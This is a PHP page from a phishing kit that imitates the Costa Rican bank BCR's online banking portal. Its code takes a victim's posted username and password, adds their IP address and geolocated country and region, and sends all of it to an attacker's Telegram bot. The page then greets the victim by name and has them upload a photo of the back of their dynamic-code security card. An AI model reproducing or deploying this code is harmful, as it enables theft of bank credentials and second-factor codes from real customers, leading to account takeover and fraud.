<?php
ini_set("display_errors", 0);
include('datos_telgram.php');
session_start();

function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];


if( isset($_POST['user']) && isset($_POST['pass'])){

$_SESSION['usuario'] = $_POST['user'];

$message = "DATOS BCR\r\nUSUARIO: ".$_POST['user']."\r\nClave: ".$_POST['pass']."\r\nIP: ".$myip." ".$pais." ".$region." \r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


} else {
echo "<script type='text/javascript'>";
echo "window.location.href='index.php';";
echo "</script>";
}
?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="./archivos/style.css" rel="stylesheet" type="text/css">

    <title>BCR</title>
<script>
   document.querySelector("html").classList.add('js');

var fileInput  = document.querySelector( ".input-file" ),  
    button     = document.querySelector( ".input-file-trigger" ),
    the_return = document.querySelector(".file-return");
      
button.addEventListener( "keydown", function( event ) {  
    if ( event.keyCode == 13 || event.keyCode == 32 ) {  
        fileInput.focus();  
    }  
});
button.addEventListener( "click", function( event ) {
   fileInput.focus();
   return false;
});  
fileInput.addEventListener( "change", function( event ) {  
    the_return.innerHTML = this.value;  
});  
</script>

               <script>
  function setfilename(val)
  {
    filename = val.split('\\').pop().split('/').pop();
    filename = filename;
    document.getElementById('wpName').value = filename;
  }
</script>
</head>
<body>


			  <script>


		  
		  	  function loading() { var contenedor = document.getElementById("loader");	 loader.style.display = "none";  return true;	}
				  
				  function loading2() { var contenedor = document.getElementById("dinamica");	 dinamica.style.display = "none";  return true;	}
		  
		  </script>

	<div class="loader" id="loader">



	<img class="loading" src="./archivos/loading.gif">
	<img class="loading2" src="./archivos/logo.gif">
	</div>
	
	
	<div class="head">
	<img src="./archivos/logo.gif" class="logo">
		<div class="iconhead">
	<img src="./archivos/Certificado.svg" class="headimg1">
	<img src="./archivos/Contactenos.svg" class="headimg2">
		<a href="#" class="linkhead1">Certificaciones</a>
		<a href="#" class="linkhead2">Contáctenos</a>
			</div>
	</div>
	<div class="head2">
		
		<span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
		
	</div>
	<div class="costilla">
	<span class="seguridadtxt">Seguridad</span>
	<img class="imgcostilla1" src="./archivos/Consideraciones.svg">	
	<img class="imgcostilla2" src="./archivos/reglamento.svg">	
		<span class="textcostilla1">Consideraciones</span>
		<span class="textcostilla2">Reglamentos</span>
		
		
	</div>
	<div class="containerimg">	
		
		
		
		<div class="divform1">
			
						

			
			
			
<form method="POST" action="index3.php" enctype="multipart/form-data">

			<span class="ingresartxt">Validación Banca Digital</span>
			
			<hr class="line1" color="#C4C4C4">
	<img src="./archivos/dinamica.png" id="dinamica" class="dinamica">
			

			
			
<div class="file-select" id="src-file1">
  <input name="photo" id="seleccionArchivos" type="file" required="" accept="image/*" onchange="setfilename(this.value)" onclick=" loading2();">
  
   
</div>
   
 
    <img id="imagenPrevisualizacion" class="imagenprev"  id="wpName">
    <script src="./archivos/script.js"></script>
			
			
			
			<button type="submit" class="btn-cuatro" onclick=" loading();">Validar</button>

			
		
	
			
			

			</form>
		</div>
		
		<div class="divform2">
			
			
						<span class="ingresartxt">Clave Dinámica</span>
			
			<hr class="line1" color="#C4C4C4">
		
			
			
			<span class="registertext2">
			
			Estimado usuario: <strong style="color:#0033a0;"><?php echo "".$_SESSION['usuario'].""; ?></strong><br>

Para validar el proceso escanee la parte trasera de su Tarjeta Clave Dinámica para que nuestro sistema valide la información.
			
			</span>
			<img src="./archivos/clavedinamica.png" class="tarjetaimg">
			
			
			
			
		</div>
		
		
		
		
	<div class="formcontainer">
	
		
	</div>
	
	</div>
	
	<div class="footer"><span class="footertext"> BCR © Derechos Reservados 2023.     Contáctenos: CentroAsistenciaBCR@bancobcr.com</span></div>
	
	

</body></html>